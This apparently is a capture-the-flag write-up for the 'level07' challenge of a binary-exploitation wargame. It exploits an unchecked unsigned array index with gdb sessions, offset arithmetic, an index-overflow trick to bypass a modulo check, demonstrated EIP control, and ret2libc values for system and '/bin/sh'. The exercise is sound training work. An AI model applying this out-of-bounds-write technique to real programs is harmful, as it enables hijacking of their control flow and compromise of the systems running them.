For this exercise we have a binary which reads on stdin and ask for command to 
manage the storage service.

There are 3 commands : 
store
read
quit

With store we can choose a number to store and an index on where to store that
number.
With read we can choose an index to read on.

By trying few input (positive and negative) we understand that the index type
is an unsigned int. That index is never checked, it is possible to send a negative
index, it makes the unsigned overflow.

Input command: store
 Number: 42
 Index: -2
 Completed store command successfully
Input command: read
 Index: -2
 Number at data[4294967294] is 42
 Completed read command successfully

We can't store value at index : index % 3 == 0.
In the assembly, we can see the size of the array (100)

   0x0804879a <+119>:	mov    $0x64,%edx
(gdb) p/d 0x64
$1 = 100

We could also find the system and "/bin/sh" addresses :

(gdb) p &system
$2 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) info proc  map
process 2942
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fd8000 0xf7fdb000     0x3000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec

With those two, we can try a ret2libc.

We tried to fuzz input to get a segfault, without result.

Let's try to find the location of eip, to see if it is possible to replace it.
We set a breakpoint on the call of read_number at line 520 in the main.
Then we check the info frame and register.

(gdb) i r
eax            0xffffd454       -11180
ecx            0xffffd500       -11008
edx            0xffffd500       -11008
ebx            0xffffd454       -11180
esp            0xffffd430       0xffffd430
ebp            0xffffd618       0xffffd618
esi            0xffffd5ec       -10772
edi            0x8048d65        134516069
eip            0x804892b        0x804892b <main+520>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99


(gdb) info frame
Stack level 0, frame at 0xffffd620:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd618, args: 
 Locals at 0xffffd618, Previous frame's sp is 0xffffd620
 Saved registers:
  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610, edi at 0xffffd614, eip at 0xffffd61c

We need eax and eip
eax            0xffffd454
eip            0xffffd61c

In the assembly we can clearly see that the buffer if sent so read_number :

   0x08048924 <+513>:   lea    0x24(%esp),%eax
   0x08048928 <+517>:   mov    %eax,(%esp)

We can find the eip real value now :

eip - eax = 0xffffd61c - 0xffffd454 = 4294956572 - 4294956116  = 456
The array is an int array so we need to divide 456 by 4 to get the real index which is 114.

But 114 % 3 = 0 

Input command: store       
 Number: 2
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command

So we have to use a bigger number to make the unsigned overflow.

114 = 1073741938. thanks to our script to find it.

We can control EIP at index 1073741938 (114): 

Input command: store
 Number: 43690    (AAAA in hexa)
 Index: 1073741938   (114)
 Completed store command successfully
Input command: quit
Segmentation fault (core dumped)
level07@OverRide:~$ dmesg | tail -1
[20188.619816] level07[3217]: segfault at aaaa ip 000000000000aaaa sp 00000000ffffd720 error 14 in level07[8048000+1000]

As the array is 100 long, we can try to store number after that range by storing 
at :

index -> system = 0xf7e6aed0 = 4159090384
index + 2 -> "/bin/sh" = 0xf7f897ec = 4160264172
